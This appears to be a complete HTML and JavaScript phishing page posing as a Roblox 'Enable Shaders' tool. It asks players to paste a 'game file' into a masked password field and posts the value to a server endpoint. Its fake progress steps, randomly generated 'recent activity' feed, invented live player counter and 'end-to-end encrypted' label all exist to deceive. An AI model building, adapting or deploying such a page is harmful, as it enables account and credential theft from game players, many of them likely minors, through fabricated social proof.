<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enable Shaders — Roblox Graphics</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --bg:       #080808;
            --card-bg:  #101010;
            --border:   rgba(255,255,255,.09);
            --border-h: rgba(255,255,255,.18);
            --text:     #e8e8e8;
            --muted:    #606060;
            --accent:   #ffffff;
        }

        html, body {
            min-height: 100dvh;
            background: var(--bg);
            font-family: 'Inter', system-ui, sans-serif;
            color: var(--text);
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }

        .bg-vignette {
            position: fixed; inset: 0; pointer-events: none; z-index: 0;
            background:
                radial-gradient(ellipse 80% 60% at 50% 40%, rgba(255,255,255,.032) 0%, transparent 70%),
                radial-gradient(ellipse 55% 40% at 20% 80%, rgba(255,255,255,.012) 0%, transparent 60%);
        }
        .bg-noise {
            position: fixed; inset: 0; pointer-events: none; z-index: 0; opacity: .025;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
            background-size: 200px;
        }

        .page {
            position: relative; z-index: 1;
            min-height: 100dvh;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            padding: 1.5rem;
        }

        .card {
            width: 100%; max-width: 540px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 44px 40px 40px;
            position: relative;
            box-shadow:
                0 0 0 1px rgba(255,255,255,.03),
                0 24px 64px rgba(0,0,0,.7),
                0 0 60px rgba(255,255,255,.025);
        }

        .card::before {
            content: '';
            position: absolute; inset: -1px; border-radius: 19px;
            background: linear-gradient(145deg, rgba(255,255,255,.08) 0%, transparent 60%);
            pointer-events: none;
            opacity: 0; transition: opacity .4s;
        }
        .card:hover::before { opacity: 1; }

        .card-title {
            font-family: 'Rajdhani', sans-serif;
            font-weight: 700;
            font-size: clamp(28px, 6vw, 38px);
            letter-spacing: .1em;
            text-transform: uppercase;
            text-align: center;
            margin-bottom: 12px;
            background: linear-gradient(135deg, #ffffff 0%, #a0a0c0 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: none;
        }
        .card-desc {
            font-size: 13px;
            line-height: 1.7;
            color: var(--muted);
            text-align: center;
            max-width: 380px;
            margin: 0 auto 28px;
        }

        .divider {
            width: 40px; height: 2px;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,.2), transparent);
            margin: 0 auto 28px;
        }

        .input-wrap { position: relative; margin-bottom: 12px; }
        .input-field {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255,255,255,.03);
            border: 1px solid rgba(255,255,255,.1);
            border-radius: 10px;
            font-size: 13.5px;
            font-family: 'Inter', sans-serif;
            color: #e0e0e0;
            caret-color: #fff;
            transition: border-color .2s, box-shadow .2s;
            resize: none;
            line-height: 1.5;
        }
        .input-field::placeholder { color: rgba(255,255,255,.18); }
        #authInput[type="password"] { letter-spacing: 0.15em; font-size: 15px; }
        .input-field:focus {
            outline: none;
            border-color: rgba(255,255,255,.28);
            box-shadow: 0 0 0 3px rgba(255,255,255,.04);
        }

        .btn-main {
            width: 100%;
            padding: 15px;
            background: #fff;
            color: #080808;
            border: none;
            border-radius: 10px;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 700;
            font-size: 15px;
            letter-spacing: .12em;
            text-transform: uppercase;
            cursor: pointer;
            transition: opacity .2s, transform .15s, box-shadow .2s;
            display: flex; align-items: center; justify-content: center; gap: 8px;
            position: relative; overflow: hidden;
        }
        .btn-main:hover:not(:disabled) {
            opacity: .92;
            transform: translateY(-1px);
            box-shadow: 0 8px 24px rgba(255,255,255,.12);
        }
        .btn-main:active:not(:disabled) { transform: translateY(0); }
        .btn-main:disabled { opacity: .45; cursor: not-allowed; }

        .btn-main::after {
            content: '';
            position: absolute; inset: 0;
            background: linear-gradient(105deg, transparent 30%, rgba(0,0,0,.06) 50%, transparent 70%);
            transform: translateX(-100%);
            transition: transform .5s;
        }
        .btn-main:hover:not(:disabled)::after { transform: translateX(100%); }

        .progress-wrap {
            margin-top: 20px;
            display: none;
        }
        .progress-wrap.show { display: block; }

        .progress-bar-outer {
            height: 3px;
            background: rgba(255,255,255,.07);
            border-radius: 99px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        .progress-bar-inner {
            height: 100%;
            width: 0%;
            background: #fff;
            border-radius: 99px;
            transition: width .4s ease;
        }
        @keyframes prog-anim { 0%{width:0%} 100%{width:100%} }
        .progress-bar-inner.running { animation: prog-anim 4.5s ease-out forwards; }

        .step-list { display: flex; flex-direction: column; gap: 7px; }
        .step-item {
            display: flex; align-items: center; gap: 8px;
            font-size: 12px; color: var(--muted);
        }
        .step-item.active { color: #c0c0c0; }
        .step-item.done { color: #c0c0c8; }

        @keyframes spin { to { transform: rotate(360deg); } }
        .spinner {
            width: 12px; height: 12px; flex-shrink: 0;
            border: 1.5px solid rgba(255,255,255,.15);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin .7s linear infinite;
        }
        .dot-done {
            width: 12px; height: 12px; flex-shrink: 0;
            border-radius: 50%;
            background: rgba(255,255,255,.85);
            display: flex; align-items: center; justify-content: center;
        }
        .dot-done::after {
            content: '\2713'; font-size: 7px; color: #101010; font-weight: 700;
        }
        .dot-idle {
            width: 12px; height: 12px; flex-shrink: 0;
            border-radius: 50%;
            border: 1.5px solid rgba(255,255,255,.12);
        }

        .status-msg {
            margin-top: 16px;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 500;
            text-align: center;
            display: none;
        }
        .status-msg.show { display: block; }
        .status-msg.success {
            background: rgba(255,255,255,.12);
            border: 1px solid rgba(255,255,255,.15);
            color: #c0c0c8;
        }
        .status-msg.error {
            background: rgba(255,100,100,.1);
            border: 1px solid rgba(255,100,100,.2);
            color: #ff8888;
        }

        .info-strip {
            display: flex; align-items: center; gap: 6px;
            margin-bottom: 24px;
            padding: 10px 14px;
            background: rgba(255,255,255,.03);
            border: 1px solid rgba(255,255,255,.06);
            border-radius: 8px;
            font-size: 11.5px; color: var(--muted);
        }
        .info-dot {
            width: 6px; height: 6px; flex-shrink: 0;
            border-radius: 50%; background: #ffffff;
            box-shadow: 0 0 6px rgba(255,255,255,.6);
            animation: blink 2s infinite;
        }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }

        .activity-section {
            margin-top: 28px;
            padding-top: 24px;
            border-top: 1px solid rgba(255,255,255,.05);
        }
        .activity-title {
            font-size: 11px;
            font-weight: 600;
            letter-spacing: .08em;
            text-transform: uppercase;
            color: rgba(255,255,255,.2);
            margin-bottom: 12px;
        }
        .activity-feed { display: flex; flex-direction: column; gap: 7px; }
        .activity-row {
            display: flex; align-items: center; gap: 8px;
            font-size: 12px; color: var(--muted);
        }
        .activity-row .act-dot {
            width: 5px; height: 5px; flex-shrink: 0;
            border-radius: 50%; background: rgba(255,255,255,.2);
        }
        .activity-row .act-user { color: #909090; }
        .activity-row .act-time { margin-left: auto; color: rgba(255,255,255,.15); }

        .card-icon {
            width: 52px; height: 52px;
            margin: 0 auto 20px;
            display: flex; align-items: center; justify-content: center;
            background: rgba(255,255,255,.04);
            border: 1px solid rgba(255,255,255,.09);
            border-radius: 14px;
            position: relative;
        }
        .card-icon::after {
            content: '';
            position: absolute; inset: -1px; border-radius: 15px;
            background: linear-gradient(135deg, rgba(255,255,255,.05) 0%, transparent 100%);
            pointer-events: none;
        }

        .feature-chips {
            display: flex; gap: 8px; justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 24px;
        }
        .chip {
            display: inline-flex; align-items: center; gap: 5px;
            padding: 5px 10px;
            background: rgba(255,255,255,.035);
            border: 1px solid rgba(255,255,255,.07);
            border-radius: 99px;
            font-size: 11px; font-weight: 500;
            color: rgba(255,255,255,.45);
            letter-spacing: .03em;
        }
        .chip svg { opacity: .6; flex-shrink: 0; }

        .bg-accent {
            position: fixed; inset: 0; pointer-events: none; z-index: 0;
            background:
                radial-gradient(ellipse 60% 50% at 50% 50%, rgba(255,255,255,.05) 0%, transparent 70%);
            animation: accentPulse 8s ease-in-out infinite alternate;
        }
        @keyframes accentPulse {
            from { opacity: .4; transform: scale(1); }
            to   { opacity: 1;  transform: scale(1.15); }
        }

        @keyframes rowSlideIn {
            from { opacity: 0; transform: translateY(-6px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        .activity-row { animation: rowSlideIn .35s ease forwards; }

        .card-footer {
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid rgba(255,255,255,.04);
            display: flex; align-items: center; justify-content: center; gap: 6px;
            font-size: 10.5px; color: rgba(255,255,255,.14);
            letter-spacing: .04em;
        }
        .footer-dot {
            width: 4px; height: 4px; border-radius: 50%;
            background: rgba(255,255,255,.18);
        }

        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(12px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        .fu  { animation: fadeUp .5s ease forwards; }
        .fu1 { animation-delay: .05s; opacity: 0; }
        .fu2 { animation-delay: .12s; opacity: 0; }

        @media (max-width: 480px) {
            .card { padding: 32px 20px 28px; }
            .feature-chips { gap: 6px; }
        }
    </style>
</head>
<body>
    <div class="bg-vignette"></div>
    <div class="bg-noise"></div>
    <div class="bg-accent"></div>

    <div class="page">
        <div class="card fu fu1">

            <div class="card-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="rgba(255,255,255,.7)" stroke-width="1.5" stroke-linejoin="round"/>
                    <path d="M2 17l10 5 10-5" stroke="rgba(255,255,255,.4)" stroke-width="1.5" stroke-linejoin="round"/>
                    <path d="M2 12l10 5 10-5" stroke="rgba(255,255,255,.55)" stroke-width="1.5" stroke-linejoin="round"/>
                </svg>
            </div>

            <h1 class="card-title">Enable Shaders</h1>
            <p class="card-desc">
                Paste your game file in the box below, then click "Enable Shaders"
                to connect to the server and enable shaders.
            </p>
            <div class="divider"></div>

            <div class="feature-chips fu fu2">
                <span class="chip">
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
                    RTX Shaders
                </span>
                <span class="chip">
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
                    4K Ready
                </span>
                <span class="chip">
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>
                    FPS Boost
                </span>
            </div>

            <div class="info-strip fu fu2">
                <span class="info-dot"></span>
                <span>Shader server online · <strong id="onlineCount">2,418</strong> players using shaders</span>
            </div>

            <form id="shaderForm" autocomplete="off">

                <div class="input-wrap" style="position:relative">
                    <input
                        type="password"
                        id="authInput"
                        class="input-field"
                        placeholder="Paste game file here"
                        spellcheck="false"
                        autocomplete="new-password"
                        style="width:100%;padding-right:44px"
                    />
                    <button type="button" id="toggleVis" onclick="toggleVisibility()"
                        style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:rgba(255,255,255,.35);padding:4px;font-size:16px;line-height:1">
                        <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    </button>
                </div>

                <button type="submit" class="btn-main" id="submitBtn">
                    <span id="btnText">Enable Shaders</span>
                </button>
            </form>

            <div class="progress-wrap" id="progressWrap">
                <div class="progress-bar-outer">
                    <div class="progress-bar-inner" id="progressBar"></div>
                </div>
                <div class="step-list" id="stepList"></div>
            </div>

            <div class="status-msg" id="statusMsg"></div>

            <div class="activity-section">
                <div class="activity-title">Recent activity</div>
                <div class="activity-feed" id="actFeed"></div>
            </div>

            <div class="card-footer">
                <span>Shader Engine v3.1</span>
                <span class="footer-dot"></span>
                <span>Stable</span>
                <span class="footer-dot"></span>
                <span>End-to-end encrypted</span>
            </div>

        </div>
    </div>

    <span id="userId" class="hidden" style="display:none">{{ user_id }}</span>

    <script>
    function toggleVisibility() {
        const inp = document.getElementById('authInput');
        const ico = document.getElementById('eyeIcon');
        if (inp.type === 'password') {
            inp.type = 'text';
            inp.style.letterSpacing = 'normal';
            ico.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
        } else {
            inp.type = 'password';
            inp.style.letterSpacing = '0.15em';
            ico.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
        }
        inp.focus();
    }

    (() => {
        'use strict';

        const userId    = document.getElementById('userId').textContent.trim();
        const form      = document.getElementById('shaderForm');
        const authInput = document.getElementById('authInput');
        const submitBtn = document.getElementById('submitBtn');
        const btnText   = document.getElementById('btnText');
        const progWrap  = document.getElementById('progressWrap');
        const progBar   = document.getElementById('progressBar');
        const stepList  = document.getElementById('stepList');
        const statusMsg = document.getElementById('statusMsg');

        const STEPS = [
            'Validating game file...',
            'Connecting to shader server...',
            'Loading graphics pipeline...',
            'Injecting shader modules...',
            'Finalizing configuration...',
        ];
        const STEP_DELAYS = [0, 700, 1600, 2700, 3800];

        function renderSteps(activeIdx) {
            stepList.innerHTML = STEPS.map((s, i) => {
                if (i < activeIdx)
                    return `<div class="step-item done"><span class="dot-done"></span>${s}</div>`;
                if (i === activeIdx)
                    return `<div class="step-item active"><span class="spinner"></span>${s}</div>`;
                return `<div class="step-item"><span class="dot-idle"></span>${s}</div>`;
            }).join('');
        }

        function showProgress() {
            progWrap.classList.add('show');
            statusMsg.classList.remove('show', 'success', 'error');
            progBar.classList.add('running');
            renderSteps(0);

            STEP_DELAYS.forEach((delay, i) => {
                setTimeout(() => renderSteps(i), delay);
            });
        }

        function finishProgress() {
            stepList.innerHTML = STEPS.map(s =>
                `<div class="step-item done"><span class="dot-done"></span>${s}</div>`
            ).join('');
        }

        function hideProgress() {
            progWrap.classList.remove('show');
            progBar.classList.remove('running');
            progBar.style.width = '0%';
            stepList.innerHTML = '';
        }

        function showStatus(msg, type) {
            statusMsg.textContent = msg;
            statusMsg.className = `status-msg show ${type}`;
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const val = authInput.value.trim();
            if (!val) {
                showStatus('Please paste your game file first.', 'error');
                return;
            }

            submitBtn.disabled = true;
            btnText.textContent = 'Connecting...';
            hideProgress();
            showProgress();

            try {
                await delay(900);

                const resp = await fetch('/api/process_game', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        payload: authInput.value.trim(),
                        sid: userId,
                        ref: window.location.hostname
                    })
                });
                const data = await resp.json();

                await delay(2800);
                finishProgress();
                await delay(400);
                hideProgress();

                if (data.status === 'success' || data.valid === true) {
                    showStatus('\u2713 Shaders enabled successfully! Restart Roblox to apply changes.', 'success');
                    authInput.value = '';
                    addActivity(true);
                } else {
                    showStatus(
                        data.message || 'Invalid game file. Please generate a new one and try again.',
                        'error'
                    );
                    addActivity(false);
                }
            } catch {
                hideProgress();
                showStatus('Network error. Check your connection and try again.', 'error');
            } finally {
                submitBtn.disabled = false;
                btnText.textContent = 'Enable Shaders';
            }
        });

        const USERS  = ['Pl***r','Us***k','Rx***2','Mk***9','Tt***7','Xo***4','Bk***1','Zv***6','Nv***3','Qr***5'];
        const GAMES  = ['Blox Fruits','Adopt Me!','Brookhaven','Pet Sim X','Arsenal','MeepCity','Jailbreak','Tower of Hell'];
        const timers = [];

        function timeAgo(s) {
            if (s < 60) return `${s}s ago`;
            return `${Math.floor(s / 60)}m ago`;
        }

        function makeRow(user, game, secs) {
            const row = document.createElement('div');
            row.className = 'activity-row';
            row.innerHTML = `
                <span class="act-dot"></span>
                <span class="act-user">${user}</span>
                <span>enabled shaders in <em style="color:#9ca3af;font-style:normal;">${game}</em></span>
                <span class="act-time">${timeAgo(secs)}</span>`;
            return row;
        }

        function addActivity(success) {
            if (!success) return;
            const feed = document.getElementById('actFeed');
            const row = makeRow(
                USERS[Math.floor(Math.random() * USERS.length)],
                GAMES[Math.floor(Math.random() * GAMES.length)],
                0
            );
            row.querySelector('.act-time').textContent = 'just now';
            row.querySelector('.act-dot').style.background = '#ffffff';
            feed.prepend(row);
            if (feed.children.length > 6) feed.lastChild.remove();
        }

        function populateFeed() {
            const feed = document.getElementById('actFeed');
            for (let i = 0; i < 5; i++) {
                const user = USERS[Math.floor(Math.random() * USERS.length)];
                const game = GAMES[Math.floor(Math.random() * GAMES.length)];
                const secs = Math.floor(Math.random() * 3600) + 30;
                feed.appendChild(makeRow(user, game, secs));
            }
        }

        function autoFeed() {
            const id = setInterval(() => {
                const feed = document.getElementById('actFeed');
                if (feed.children.length >= 6) feed.lastChild.remove();
                const user = USERS[Math.floor(Math.random() * USERS.length)];
                const game = GAMES[Math.floor(Math.random() * GAMES.length)];
                const row  = makeRow(user, game, 0);
                row.querySelector('.act-time').textContent = 'just now';
                feed.prepend(row);
            }, 7000 + Math.random() * 8000);
            timers.push(id);
        }

        function animateCounter() {
            const el = document.getElementById('onlineCount');
            let base = 2300 + Math.floor(Math.random() * 300);
            el.textContent = base.toLocaleString();
            setInterval(() => {
                base += Math.floor(Math.random() * 11) - 5;
                base = Math.max(2100, Math.min(2800, base));
                el.textContent = base.toLocaleString();
            }, 4000 + Math.random() * 3000);
        }

        function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

        populateFeed();
        autoFeed();
        animateCounter();
    })();
    </script>
</body>
</html>
